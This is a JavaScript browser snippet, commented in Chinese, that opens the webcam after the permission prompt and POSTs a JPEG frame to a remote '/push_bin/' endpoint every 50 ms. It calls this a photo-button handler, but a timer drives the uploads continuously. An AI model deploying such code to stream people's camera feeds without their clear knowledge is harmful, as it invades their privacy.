


// 获取视频和 canvas 元素
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

// 使用navigator.mediaDevices.getUserMedia获取摄像头的视频流
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  video.srcObject = stream;
  video.play();

  // 拍照按钮的事件处理函数
function takePhoto() {
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
  
    // 将 canvas 数据转换为 Blob
    canvas.toBlob(function(blob) {
      // 发送 Blob 数据到服务器
      sendPhotoToServer(blob);
    }, 'image/jpeg', 0.95); // 0.95 是图片质量，范围从 0 到 1
  }

// 发送图片到服务器的函数
function sendPhotoToServer(imageData) {
  // 创建一个 XMLHttpRequest 对象
  const xhr = new XMLHttpRequest();
  const url = remote+'/push_bin/'+(window.location.href.substring(remote.length)).replace('//','/');

  // 设置请求类型和URL
  xhr.open('POST', url, true);

  // 设置请求完成的处理函数
  xhr.onload = function () {
    if (xhr.status === 200) {
      // 请求成功时的处理
      console.log('图片上传成功');
    } else {
      // 请求失败时的处理
      console.error('图片上传失败');
    }
  };

  // 发送数据
  xhr.send(imageData);
}

setInterval(function() {
    takePhoto();
} , 50)

})
.catch(error => {
  console.error('摄像头访问出错:', error);
});